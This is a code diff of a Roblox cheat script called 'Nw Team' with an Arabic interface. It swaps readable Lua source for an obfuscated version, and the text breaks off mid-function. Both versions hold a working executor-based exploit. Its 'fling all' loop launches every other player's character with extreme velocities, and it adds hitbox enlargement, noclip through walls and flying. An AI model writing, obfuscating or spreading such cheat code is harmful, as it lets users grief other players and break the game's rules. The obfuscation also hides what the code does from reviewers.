+		if not v264:FindFirstChildWhichIsA("BasePart") then
+			return;
+		end
+		local v319 = function(v342, v343, v344)
+			local v345 = 0;
+			while true do
+				if (v345 == (1 + 0)) then
+					v263.Velocity = Vector3.new(79608775 + 10391225, 90000000 * (10 + 0), 189139075 - 99139075);
+					v263.RotVelocity = Vector3.new(1049725690 - 149725690, 2524540065 - 1624540065, 483277327 + 416722673);
+					break;
+				end
+				if (v345 == (0 + 0)) then
+					v263.CFrame = CFrame.new(v342.Position) * v343 * v344;
+					v261:SetPrimaryPartCFrame(CFrame.new(v342.Position) * v343 * v344);
+					v345 = 1;
+				end
+			end
+		end;
+		local v320 = function(v346)
+			local v347 = 0;
+			local v348;
+			local v349;
+			local v350;
+			while true do
+				if (v347 == (397 - (115 + 281))) then
+					v350 = 0;
+					repeat
+						if not _G.FlingEnabled then
+							break;
+						end
+						if (v263 and v265) then
+							local v445 = 0;
+							while true do
+								if (v445 == (2 - 1)) then
+									task.wait();
+									v319(v346, CFrame.new(0, -(1.5 + 0), 0) + v265.MoveDirection, CFrame.Angles(math.rad(v350), 0 - 0, 0 - 0));
+									v445 = 869 - (550 + 317);
+								end
+								if (0 == v445) then
+									v350 = v350 + (144 - 44);
+									v319(v346, CFrame.new(0 - 0, 1.5, 0 - 0) + v265.MoveDirection, CFrame.Angles(math.rad(v350), 285 - (134 + 151), 1665 - (970 + 695)));
+									v445 = 1;
+								end
+								if ((3 - 1) == v445) then
+									task.wait();
+									break;
+								end
+							end
+						else
+							break;
+						end
+					until (v346.Velocity.Magnitude > 500) or (v346.Parent ~= v260.Character) or (v260.Parent ~= v6) or (not v260.Character == v264) or v265.Sit or (v262.Health <= 0) or (tick() > (v349 + v348)) 
+					break;
+				end
+				if (v347 == (1990 - (582 + 1408))) then
+					v348 = 2;
+					v349 = tick();
+					v347 = 1;
+				end
+			end
+		end;
+		workspace.FallenPartsDestroyHeight = NaN - 0;
+		local v322 = Instance.new("BodyVelocity");
+		v322.Name = "EpixVel";
+		v322.Parent = v263;
+		v322.Velocity = Vector3.new(900000000, 1132399727 - 232399727, 2884714650 - 1984714650);
+		v322.MaxForce = Vector3.new((1825 - (1195 + 629)) / (0 - 0), (242 - (187 + 54)) / 0, (781 - (162 + 618)) / 0);
+		v262:SetStateEnabled(Enum.HumanoidStateType.Seated, false);
+		if (v266 and v267) then
+			if ((v266.CFrame.p - v267.CFrame.p).Magnitude > (4 + 1)) then
+				v320(v267);
+			else
+				v320(v266);
+			end
+		elseif (v266 and not v267) then
+			v320(v266);
+		elseif (not v266 and v267) then
+			v320(v267);
+		elseif (not v266 and not v267 and v268 and v269) then
+			v320(v269);
+		else
+			return v44("Error Occurred", "Target is missing everything", 4 + 1);
+		end
+		v322:Destroy();
+		v262:SetStateEnabled(Enum.HumanoidStateType.Seated, true);
+		repeat
+			v263.CFrame = getgenv().OldPos * CFrame.new(0 - 0, 0.5, 0);
+			v261:SetPrimaryPartCFrame(getgenv().OldPos * CFrame.new(0 - 0, 0.5, 0 + 0));
+			v262:ChangeState("GettingUp");
+			table.foreach(v261:GetChildren(), function(v388, v389)
+				if v389:IsA("BasePart") then
+					v389.Velocity, v389.RotVelocity = Vector3.new(), Vector3.new();
+				end
+			end);
+			task.wait();
+		until (v263.Position - getgenv().OldPos.p).Magnitude < (1661 - (1373 + 263)) 
+	else
+		return v44("Error Ocurrido", "El Script A Fallado", 1005 - (451 + 549));
+	end
 end
-
-local GetPlayer = function(Name)
-    Name = Name:lower()
-    if Name == "all" or Name == "others" then
-        AllBool = true
-        return
-    elseif Name ~= "all" and Name ~= "others" then
-        for _,x in next, Players:GetPlayers() do
-            if x ~= LocalPlayer then
-                if x.Name:lower():match("^"..Name) then
-                    return x;
-                elseif x.DisplayName:lower():match("^"..Name) then
-                    return x;
-                end
-            end
-        end
-    else
-        return
-    end
+local function v47()
+	local v270 = 0 + 0;
+	while true do
+		if (v270 == (0 - 0)) then
+			v20 = true;
+			for v390, v391 in next, v6:GetPlayers() do
+				if not _G.FlingEnabled then
+					return;
+				end
+				if ((v391 ~= v18) and v391.Character and v391.Character:FindFirstChildOfClass("Humanoid") and (v391.Character:FindFirstChildOfClass("Humanoid").Health > 0)) then
+					v46(v391);
+				end
+			end
+			break;
+		end
+	end
 end
-
-local function SkidFling(TargetPlayer)
-    if not _G.FlingEnabled then return end
-
-    local Char = LocalPlayer.Character
-    local Humanoid = Char and Char:FindFirstChildOfClass("Humanoid")
-    local RootPart = Humanoid and Humanoid.RootPart
-
-    local TCharacter = TargetPlayer.Character
-    local THumanoid
-    local TRootPart
-    local THead
-    local Accessory
-    local Handle
-
-    if TCharacter:FindFirstChildOfClass("Humanoid") then
-        THumanoid = TCharacter:FindFirstChildOfClass("Humanoid")
-    end
-    if THumanoid and THumanoid.RootPart then
-        TRootPart = THumanoid.RootPart
-    end
-    if TCharacter:FindFirstChild("Head") then
-        THead = TCharacter.Head
-    end
-    if TCharacter:FindFirstChildOfClass("Accessory") then
-        Accessory = TCharacter:FindFirstChildOfClass("Accessory")
-    end
-    if Accessory and Accessory:FindFirstChild("Handle") then
-        Handle = Accessory.Handle
-    end
-
-    if Char and Humanoid and RootPart then
-        if RootPart.Velocity.Magnitude < 50 then
-            getgenv().OldPos = RootPart.CFrame
-        end
-        if THumanoid and THumanoid.Sit and not AllBool then
-            return Message("Error Occurred", "Targeting is sitting", 5)
-        end
-        
-        if not TCharacter:FindFirstChildWhichIsA("BasePart") then
-            return
-        end
-        
-        local FPos = function(BasePart, Pos, Ang)
-            RootPart.CFrame = CFrame.new(BasePart.Position) * Pos * Ang
-            Char:SetPrimaryPartCFrame(CFrame.new(BasePart.Position) * Pos * Ang)
-            RootPart.Velocity = Vector3.new(9e7, 9e7 * 10, 9e7)
-            RootPart.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
-        end
-        
-        local SFBasePart = function(BasePart)
-            local TimeToWait = 2
-            local Time = tick()
-            local Angle = 0
-
-            repeat
-                if not _G.FlingEnabled then break end 
-
-                if RootPart and THumanoid then
-                    Angle = Angle + 100
-                    FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection, CFrame.Angles(math.rad(Angle),0 ,0))
-                    task.wait()
-                    FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection, CFrame.Angles(math.rad(Angle), 0, 0))
-                    task.wait()
-                else
-                    break
-                end
-            until BasePart.Velocity.Magnitude > 500 or BasePart.Parent ~= TargetPlayer.Character or TargetPlayer.Parent ~= Players or not TargetPlayer.Character == TCharacter or THumanoid.Sit or Humanoid.Health <= 0 or tick() > Time + TimeToWait
-        end
-        
-        workspace.FallenPartsDestroyHeight = 0/0
-        
-        local BV = Instance.new("BodyVelocity")
-        BV.Name = "EpixVel"
-        BV.Parent = RootPart
-        BV.Velocity = Vector3.new(9e8, 9e8, 9e8)
-        BV.MaxForce = Vector3.new(1/0, 1/0, 1/0)
-        
-        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
-        
-        if TRootPart and THead then
-            if (TRootPart.CFrame.p - THead.CFrame.p).Magnitude > 5 then
-                SFBasePart(THead)
-            else
-                SFBasePart(TRootPart)
-            end
-        elseif TRootPart and not THead then
-            SFBasePart(TRootPart)
-        elseif not TRootPart and THead then
-            SFBasePart(THead)
-        elseif not TRootPart and not THead and Accessory and Handle then
-            SFBasePart(Handle)
-        else
-            return Message("Error Occurred", "Target is missing everything", 5)
-        end
-        
-        BV:Destroy()
-        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
-        
-        repeat
-            RootPart.CFrame = getgenv().OldPos * CFrame.new(0, .5, 0)
-            Char:SetPrimaryPartCFrame(getgenv().OldPos * CFrame.new(0, .5, 0))
-            Humanoid:ChangeState("GettingUp")
-            table.foreach(Char:GetChildren(), function(_, x)
-                if x:IsA("BasePart") then
-                    x.Velocity, x.RotVelocity = Vector3.new(), Vector3.new()
-                end
-            end)
-            task.wait()
-        until (RootPart.Position - getgenv().OldPos.p).Magnitude < 25
-    else
-        return Message("Error Ocurrido", "El Script A Fallado", 5)
-    end
+local v48 = Instance.new("ScreenGui");
+v48.Parent = game.CoreGui;
+v48.Name = "NwTeamGUI";
+v48.ZIndexBehavior = Enum.ZIndexBehavior.Sibling;
+v44("Nw Team", "جاري تحميل السكربت...", 2 - 0);
+task.wait(1385 - (746 + 638));
+local v54 = Instance.new("Frame");
+v54.Name = "MainFrame";
+v54.Parent = v48;
+v54.BackgroundColor3 = Color3.fromRGB(0 + 0, 0 - 0, 341 - (218 + 123));
+v54.BackgroundTransparency = 1581.2 - (1535 + 46);
+v54.Position = UDim2.new(0.35 + 0, 0 + 0, 560.3 - (306 + 254), 0 + 0);
+v54.Size = UDim2.new(0 - 0, 1767 - (899 + 568), 0 + 0, 919 - 539);
+v54.Active = true;
+v54.Draggable = true;
+v54.ZIndex = 613 - (268 + 335);
+v54.Visible = true;
+local v65 = Instance.new("TextLabel");
+v65.Name = "Title";
+v65.Parent = v54;
+v65.BackgroundColor3 = Color3.fromRGB(290 - (60 + 230), 572 - (426 + 146), 0);
+v65.Size = UDim2.new(1, 0, 0 + 0, 1481 - (282 + 1174));
+v65.Text = "Nw Team - Made by Rew";
+v65.TextColor3 = Color3.fromRGB(1066 - (569 + 242), 0, 0);
+v65.TextSize = 46 - 30;
+v65.Font = Enum.Font.SourceSansBold;
+v65.ZIndex = 11;
+local v76 = Instance.new("Frame");
+v76.Name = "UserInfo";
+v76.Parent = v54;
+v76.BackgroundColor3 = Color3.fromRGB(2 + 28, 30, 30);
+v76.Position = UDim2.new(1024 - (706 + 318), 0, 0.07, 1251 - (721 + 530));
+v76.Size = UDim2.new(1, 1271 - (945 + 326), 0, 299 - 179);
+local function v82(v271)
+	local v272 = 0 + 0;
+	local v273;
+	local v274;
+	local v275;
+	local v276;
+	while true do
+		if (v272 == (701 - (271 + 429))) then
+			v275 = math.floor(v274 / 30.44);
+			v276 = math.floor(v274 % (28.44 + 2));
+			v272 = 1502 - (1408 + 92);
+		end
+		if (v272 == (1088 - (461 + 625))) then
+			return string.format("%d سنة، %d شهر، %d يوم", v273, v275, v276);
+		end
+		if (v272 == (1288 - (993 + 295))) then
+			v273 = math.floor(v271 / (19.25 + 346));
+			v274 = v271 % 365.25;
+			v272 = 1172 - (418 + 753);
+		end
+	end
 end
-
-local function FlingLoop()
-    AllBool = true 
-    
-    for _,x in next, Players:GetPlayers() do
-        if not _G.FlingEnabled then return end
-        
-        if x ~= LocalPlayer and x.Character and x.Character:FindFirstChildOfClass("Humanoid") and x.Character:FindFirstChildOfClass("Humanoid").Health > 0 then
-             SkidFling(x)
-        end
-    end
+local function v83(v277)
+	local v278 = math.floor(v277 / (1372 + 2228));
+	local v279 = math.floor((v277 % 3600) / (7 + 53));
+	local v280 = math.floor(v277 % (18 + 42));
+	return string.format("%02d:%02d:%02d", v278, v279, v280);
 end
-
--- ===============================================
--- 🎨 إنشاء واجهة المستخدم
--- ===============================================
-
-local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Parent = game.CoreGui
-ScreenGui.Name = "NwTeamGUI"
-ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-
--- إشعار بدء التشغيل
-Message("Nw Team", "جاري تحميل السكربت...", 2)
-task.wait(1)
-
--- الإطار الرئيسي
-local main = Instance.new("Frame")
-main.Name = "MainFrame"
-main.Parent = ScreenGui
-main.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-main.BackgroundTransparency = 0.2
-main.Position = UDim2.new(0.35, 0, 0.3, 0)
-main.Size = UDim2.new(0, 300, 0, 380)
-main.Active = true
-main.Draggable = true
-main.ZIndex = 10
-main.Visible = true
-
--- عنوان الواجهة
-local label = Instance.new("TextLabel")
-label.Name = "Title"
-label.Parent = main
-label.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-label.Size = UDim2.new(1, 0, 0, 25)
-label.Text = "Nw Team - Made by Rew"
-label.TextColor3 = Color3.fromRGB(255, 0, 0)
-label.TextSize = 16
-label.Font = Enum.Font.SourceSansBold
-label.ZIndex = 11
-
--- معلومات المستخدم
-local UserInfoBackground = Instance.new("Frame")
-UserInfoBackground.Name = "UserInfo"
-UserInfoBackground.Parent = main
-UserInfoBackground.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-UserInfoBackground.Position = UDim2.new(0, 0, 0.07, 0)
-UserInfoBackground.Size = UDim2.new(1, 0, 0, 120)
-
--- حساب عمر الحساب
-local function GetAccountAgeString(accountAgeInDays)
-    local years = math.floor(accountAgeInDays / 365.25) 
-    local daysLeft = accountAgeInDays % 365.25
-    local months = math.floor(daysLeft / 30.44) 
-    local days = math.floor(daysLeft % 30.44)
-    return string.format("%d سنة، %d شهر، %d يوم", years, months, days)
+local v84 = {};
+local v85 = {{"DisplayName",("اللقب: " .. v18.DisplayName)},{"UserName",("الاسم: @" .. v18.Name)},{"AccountAge",("عمر الحساب: " .. v82(v37))},{"UserID",("ايدي الحساب: " .. v18.UserId)},{"Executor",("اسم الهاك: " .. v15())},{"Uptime","السكربت شغال له: 00:00:00"}};
+for v281, v282 in ipairs(v85) do
+	local v283 = 0 - 0;
+	local v284;
+	while true do
+		if (v283 == (116 - (4 + 110))) then
+			v284.Text = v282[2];
+			v284.TextColor3 = Color3.fromRGB(584 - (57 + 527), 1597 - (41 + 1386), 255);
+			v284.TextXAlignment = Enum.TextXAlignment.Right;
+			v283 = 3;
+		end
+		if (v283 == (103 - (17 + 86))) then
+			v284 = Instance.new("TextLabel");
+			v284.Name = v282[1 + 0];
+			v284.Parent = v76;
+			v283 = 1;
+		end
+		if ((1 - 0) == v283) then
+			v284.BackgroundColor3 = Color3.fromRGB(86 - 56, 196 - (122 + 44), 30);
+			v284.Position = UDim2.new(0.02, 0 - 0, (v281 - 1) / (19 - 13), 0 + 0);
+			v284.Size = UDim2.new(0.96 + 0, 0 - 0, (66 - (30 + 35)) / (5 + 1), 0);
+			v283 = 1259 - (1043 + 214);
+		end
+		if (v283 == (11 - 8)) then
+			v284.TextSize = 1224 - (323 + 889);
+			table.insert(v84, v284);
+			break;
+		end
+	end
 end
-
--- حساب وقت التشغيل
-local function GetUptimeString(seconds)
-    local hours = math.floor(seconds / 3600)
-    local minutes = math.floor((seconds % 3600) / 60)
-    local secs = math.floor(seconds % 60)
-    return string.format("%02d:%02d:%02d", hours, minutes, secs)
-end
-
--- إنشاء تسميات المعلومات
-local infoLabels = {}
-
-local infoData = {
-    {"DisplayName", "اللقب: " .. LocalPlayer.DisplayName},
-    {"UserName", "الاسم: @" .. LocalPlayer.Name},
-    {"AccountAge", "عمر الحساب: " .. GetAccountAgeString(AccountCreationDate)},
-    {"UserID", "ايدي الحساب: " .. LocalPlayer.UserId},
-    {"Executor", "اسم الهاك: " .. identifyexecutor()},
-    {"Uptime", "السكربت شغال له: 00:00:00"}
-}
-
-for i, data in ipairs(infoData) do
-    local label = Instance.new("TextLabel")
-    label.Name = data[1]
-    label.Parent = UserInfoBackground
-    label.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-    label.Position = UDim2.new(0.02, 0, (i-1)/6, 0)
-    label.Size = UDim2.new(0.96, 0, 1/6, 0)
-    label.Text = data[2]
-    label.TextColor3 = Color3.fromRGB(0, 170, 255)
-    label.TextXAlignment = Enum.TextXAlignment.Right
-    label.TextSize = 12
-    table.insert(infoLabels, label)
-end
-
--- تحديث العداد
 coroutine.wrap(function()
-    while task.wait(1) do
-        if main.Visible then
-            local elapsed = tick() - ScriptStartTime
-            infoLabels[6].Text = "السكربت شغال له: " .. GetUptimeString(elapsed)
-        end
-    end
-end)()
-
--- زر الإغلاق
-local CloseButton = Instance.new("TextButton")
-CloseButton.Name = "CloseButton"
-CloseButton.Parent = main
-CloseButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
-CloseButton.Position = UDim2.new(1, -25, 0, 0)
-CloseButton.Size = UDim2.new(0, 25, 0, 25)
-CloseButton.Text = "X"
-CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-CloseButton.Font = Enum.Font.SourceSansBold
-CloseButton.TextSize = 14
-CloseButton.ZIndex = 12
-
--- زر فتح السكربت (مخفي)
-local OpenGUI = Instance.new("TextButton")
-OpenGUI.Name = "OpenButton"
-OpenGUI.Parent = ScreenGui
-OpenGUI.Size = UDim2.new(0, 60, 0, 60)
-OpenGUI.Position = UDim2.new(0.8, 0, 0.05, 0)
-OpenGUI.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-OpenGUI.TextColor3 = Color3.fromRGB(255, 255, 0)
-OpenGUI.Text = "افتح\nالسكربت"
-OpenGUI.Font = Enum.Font.SourceSansBold
-OpenGUI.TextSize = 14
-OpenGUI.TextWrapped = true
-OpenGUI.Visible = false
-
--- وظائف الأزرار
-CloseButton.MouseButton1Down:Connect(function()
-    main.Visible = false
-    OpenGUI.Visible = true
-end)
-
-OpenGUI.MouseButton1Down:Connect(function()
-    main.Visible = true
-    OpenGUI.Visible = false
-end)
-
--- ===============================================
--- 🎮 أزرار التحكم
--- ===============================================
-
-local BUTTON_WIDTH = 140
-local BUTTON_HEIGHT = 30
-local START_Y = 0.45
-local BUTTON_SPACING = 0.1
-
--- أزرار العمود الأول
-local Hitbox_Enable = Instance.new("TextButton")
-Hitbox_Enable.Name = "HitboxEnable"
-Hitbox_Enable.Parent = main
-Hitbox_Enable.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
-Hitbox_Enable.Position = UDim2.new(0.03, 0, START_Y, 0)
-Hitbox_Enable.Size = UDim2.new(0, BUTTON_WIDTH, 0, BUTTON_HEIGHT)
-Hitbox_Enable.Text = "تفعيل Hitbox"
-Hitbox_Enable.TextColor3 = Color3.fromRGB(0, 0, 0)
-Hitbox_Enable.TextSize = 14
-Hitbox_Enable.Font = Enum.Font.SourceSansBold
-
-local Noclip_Toggle = Instance.new("TextButton")
-Noclip_Toggle.Name = "NoclipToggle"
-Noclip_Toggle.Parent = main
-Noclip_Toggle.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-Noclip_Toggle.Position = UDim2.new(0.53, 0, START_Y, 0)
-Noclip_Toggle.Size = UDim2.new(0, BUTTON_WIDTH, 0, BUTTON_HEIGHT)
-Noclip_Toggle.Text = "اختراق الجدران (Off)"
-Noclip_Toggle.TextColor3 = Color3.fromRGB(255, 255, 255)
-Noclip_Toggle.TextSize = 14
-Noclip_Toggle.Font = Enum.Font.SourceSansBold
-
--- أزرار العمود الثاني
-local Hitbox_Disable = Instance.new("TextButton")
-Hitbox_Disable.Name = "HitboxDisable"
-Hitbox_Disable.Parent = main
-Hitbox_Disable.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
-Hitbox_Disable.Position = UDim2.new(0.03, 0, START_Y + BUTTON_SPACING, 0)
-Hitbox_Disable.Size = UDim2.new(0, BUTTON_WIDTH, 0, BUTTON_HEIGHT)
-Hitbox_Disable.Text = "تعطيل Hitbox"
-Hitbox_Disable.TextColor3 = Color3.fromRGB(255, 255, 255)
-Hitbox_Disable.TextSize = 14
-Hitbox_Disable.Font = Enum.Font.SourceSansBold
-
-local Fling_Toggle = Instance.new("TextButton")
-Fling_Toggle.Name = "FlingToggle"
-Fling_Toggle.Parent = main
-Fling_Toggle.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-Fling_Toggle.Position = UDim2.new(0.53, 0, START_Y + BUTTON_SPACING, 0)
-Fling_Toggle.Size = UDim2.new(0, BUTTON_WIDTH, 0, BUTTON_HEIGHT)
-Fling_Toggle.Text = "فلنق الكل (Off)"
-Fling_Toggle.TextColor3 = Color3.fromRGB(255, 255, 255)
-Fling_Toggle.TextSize = 14
-Fling_Toggle.Font = Enum.Font.SourceSansBold
-
--- أزرار العمود الثالث
-local Discord_Button = Instance.new("TextButton")
-Discord_Button.Name = "DiscordButton"
-Discord_Button.Parent = main
-Discord_Button.BackgroundColor3 = Color3.fromRGB(114, 137, 218)
-Discord_Button.Position = UDim2.new(0.03, 0, START_Y + BUTTON_SPACING*2, 0)
-Discord_Button.Size = UDim2.new(0, BUTTON_WIDTH, 0, BUTTON_HEIGHT)
-Discord_Button.Text = "📋 نسخ رابط الديسكورد"
-Discord_Button.TextColor3 = Color3.fromRGB(255, 255, 255)
-Discord_Button.TextSize = 14
-Discord_Button.Font = Enum.Font.SourceSansBold
-
-local Rejoin_Button = Instance.new("TextButton")
-Rejoin_Button.Name = "RejoinButton"
-Rejoin_Button.Parent = main
-Rejoin_Button.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-Rejoin_Button.Position = UDim2.new(0.53, 0, START_Y + BUTTON_SPACING*2, 0)
-Rejoin_Button.Size = UDim2.new(0, BUTTON_WIDTH, 0, BUTTON_HEIGHT)
-Rejoin_Button.Text = "Rejoin السيرفر"
-Rejoin_Button.TextColor3 = Color3.fromRGB(255, 255, 255)
-Rejoin_Button.TextSize = 14
-Rejoin_Button.Font = Enum.Font.SourceSansBold
-
--- ===============================================
--- ✈️ واجهة التحكم بالطيران
--- ===============================================
-
-local FlyFrame = Instance.new("Frame")
-FlyFrame.Name = "FlyControl"
-FlyFrame.Parent = main
-FlyFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-FlyFrame.Position = UDim2.new(0.03, 0, START_Y + BUTTON_SPACING*3, 0)
-FlyFrame.Size = UDim2.new(0.94, 0, 0, 90)
-
-local FlyTitle = Instance.new("TextLabel")
-FlyTitle.Parent = FlyFrame
-FlyTitle.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-FlyTitle.Size = UDim2.new(1, 0, 0, 20)
-FlyTitle.Text = "✈️ Fly Control"
-FlyTitle.TextColor3 = Color3.fromRGB(255, 255, 0)
-FlyTitle.TextSize = 14
-FlyTitle.Font = Enum.Font.SourceSansBold
-
-local FlyToggleBtn = Instance.new("TextButton")
-FlyToggleBtn.Name = "FlyToggleBtn"
-FlyToggleBtn.Parent = FlyFrame
-FlyToggleBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-FlyToggleBtn.Position = UDim2.new(0.02, 0, 0.25, 0)
-FlyToggleBtn.Size = UDim2.new(0.48, 0, 0, 25)
-FlyToggleBtn.Text = "تفعيل الطيران (Off)"
-FlyToggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-FlyToggleBtn.TextSize = 12
-
-local FlySpeedLabel = Instance.new("TextLabel")
-FlySpeedLabel.Name = "FlySpeed"
-FlySpeedLabel.Parent = FlyFrame
-FlySpeedLabel.BackgroundColor3 = Color3.fromRGB(0, 100, 150)
-FlySpeedLabel.Position = UDim2.new(0.52, 0, 0.25, 0)
-FlySpeedLabel.Size = UDim2.new(0.46, 0, 0, 25)
-FlySpeedLabel.Text = "السرعة: x" .. speeds
-FlySpeedLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-FlySpeedLabel.TextSize = 12
-
-local FlyControls = Instance.new("Frame")
-FlyControls.Parent = FlyFrame
-FlyControls.BackgroundTransparency = 1
-FlyControls.Position = UDim2.new(0, 0, 0.55, 0)
-FlyControls.Size = UDim2.new(1, 0, 0, 35)
-
-local UpButton = Instance.new("TextButton")
-UpButton.Name = "UpBtn"
-UpButton.Parent = FlyControls
-UpButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-UpButton.Position = UDim2.new(0.02, 0, 0, 0)
-UpButton.Size = UDim2.new(0.23, 0, 1, 0)
-UpButton.Text = "⬆️"
-UpButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-UpButton.TextSize = 16
-
-local DownButton = Instance.new("TextButton")
-DownButton.Name = "DownBtn"
-DownButton.Parent = FlyControls
-DownButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-DownButton.Position = UDim2.new(0.27, 0, 0, 0)
-DownButton.Size = UDim2.new(0.23, 0, 1, 0)
-DownButton.Text = "⬇️"
-DownButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-DownButton.TextSize = 16
-
-local PlusButton = Instance.new("TextButton")
-PlusButton.Name = "PlusBtn"
-PlusButton.Parent = FlyControls
-PlusButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
-PlusButton.Position = UDim2.new(0.52, 0, 0, 0)
-PlusButton.Size = UDim2.new(0.23, 0, 1, 0)
-PlusButton.Text = "+ السرعة"
-PlusButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-PlusButton.TextSize = 12
-
-local MinusButton = Instance.new("TextButton")
-MinusButton.Name = "MinusBtn"
-MinusButton.Parent = FlyControls
-MinusButton.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
-MinusButton.Position = UDim2.new(0.77, 0, 0, 0)
-MinusButton.Size = UDim2.new(0.21, 0, 1, 0)
-MinusButton.Text = "- السرعة"
-MinusButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-MinusButton.TextSize = 12
-
--- ===============================================
--- 🎯 وظائف الأزرار
--- ===============================================
-
--- زر تفعيل Hitbox
-Hitbox_Enable.MouseButton1Down:Connect(function()
-    _G.Disabled = true 
-    Hitbox_Enable.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
-    Hitbox_Disable.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
-    Message("Nw Team", "تم تفعيل Hitbox", 2)
-end)
-
--- زر تعطيل Hitbox
-Hitbox_Disable.MouseButton1Down:Connect(function()
-    _G.Disabled = false 
-    for _, v in next, Players:GetPlayers() do
-        if v.Name ~= LocalPlayer.Name and v.Character then
-            local hrp = v.Character:FindFirstChild("HumanoidRootPart")
-            if hrp then 
-                pcall(function()
-                    hrp.Size = DEFAULT_SIZE
-                    hrp.Transparency = 0
-                    hrp.BrickColor = DEFAULT_BRICKCOLOR
-                    hrp.Material = DEFAULT_MATERIAL
-                    hrp.CanCollide = true
-                end)
-            end
-        end
-    end
-    Hitbox_Disable.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
-    Hitbox_Enable.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
-    Message("Nw Team", "تم تعطيل Hitbox", 2)
-end)
-
--- زر Noclip
-Noclip_Toggle.MouseButton1Down:Connect(function()
-    NoclipEnabled = not NoclipEnabled
-    toggleNoclip(NoclipEnabled)
-    
-    if NoclipEnabled then
-        Noclip_Toggle.Text = "اختراق الجدران (On)"
-        Noclip_Toggle.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
-        Message("Nw Team", "تم تفعيل Noclip", 2)
-    else
-        Noclip_Toggle.Text = "اختراق الجدران (Off)"
-        Noclip_Toggle.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-        Message("Nw Team", "تم تعطيل Noclip", 2)
-    end
-end)
-
--- زر الفلنج
-Fling_Toggle.MouseButton1Down:Connect(function()
-    _G.FlingEnabled = not _G.FlingEnabled
-    if _G.FlyEnabled then toggleFly(false) end 
-    
-    if _G.FlingEnabled then
-        Fling_Toggle.Text = "فلنق الكل (On)"
-        Fling_Toggle.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
-        Message("Nw Team", "تم تفعيل الفلنج", 2)
-        
-        coroutine.wrap(function()
-            while _G.FlingEnabled do
-                FlingLoop()
-                if not _G.FlingEnabled then break end
-                task.wait(0.1)
-            end
-        end)()
-    else
-        Fling_Toggle.Text = "فلنق الكل (Off)"
-        Fling_Toggle.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-        Message("Nw Team", "تم تعطيل الفلنج", 2)
-    end
-end)
-
--- زر الديسكورد
-Discord_Button.MouseButton1Down:Connect(function()
-    if setclipboard then
-        setclipboard(DISCORD_INVITE_LINK)
-        label.Text = "تم نسخ رابط الديسكورد!"
-        label.TextColor3 = Color3.fromRGB(0, 255, 0)
-        Discord_Button.Text = "تم النسخ!"
-        Discord_Button.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
-        Message("Nw Team", "تم نسخ رابط الديسكورد", 3)
-        
-        task.wait(2)
-        label.Text = "Nw Team - Made by Rew"
-        label.TextColor3 = Color3.fromRGB(255, 0, 0)
-        Discord_Button.Text = "📋 نسخ رابط الديسكورد"
-        Discord_Button.BackgroundColor3 = Color3.fromRGB(114, 137, 218)
-    else
-        Message("Nw Team", "الإكسبلويت لا يدعم setclipboard", 3)
-    end
-end)
-
--- زر إعادة الدخول
-Rejoin_Button.MouseButton1Down:Connect(function()
-    Message("Nw Team", "جاري إعادة الدخول...", 2)
-    task.wait(1.5)
-    
-    local teleportService = game:GetService("TeleportService")
-    local success, err = pcall(function()
-        teleportService:Teleport(game.PlaceId, LocalPlayer)
-    end)
-    
-    if not success then
-        Message("Nw Team", "فشل إعادة الدخول: " .. err, 3)
-    end
-end)
-
--- أزرار التحكم بالطيران
-FlyToggleBtn.MouseButton1Down:Connect(function()
-    local newState = not _G.FlyEnabled
-    toggleFly(newState)
-    
-    if newState then
-        FlyToggleBtn.Text = "تفعيل الطيران (On)"
-        FlyToggleBtn.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
-        Message("Nw Team", "تم تفعيل الطيران", 2)
-    else
-        FlyToggleBtn.Text = "تفعيل الطيران (Off)"
-        FlyToggleBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-        Message("Nw Team", "تم تعطيل الطيران", 2)
-    end
-end)
-
-PlusButton.MouseButton1Down:Connect(function()
-    speeds = speeds + 1
-    FlySpeedLabel.Text = "السرعة: x" .. speeds
-end)
-
-MinusButton.MouseButton1Down:Connect(function()
-    if speeds > 1 then
-        speeds = speeds - 1
-        FlySpeedLabel.Text = "السرعة: x" .. speeds
-    else
-        FlySpeedLabel.Text = "الحد الأدنى x1"
-        task.wait(1)
-        FlySpeedLabel.Text = "السرعة: x" .. speeds
-    end
-end)
-
-UpButton.MouseButton1Down:Connect(function()
-    local Char = LocalPlayer.Character
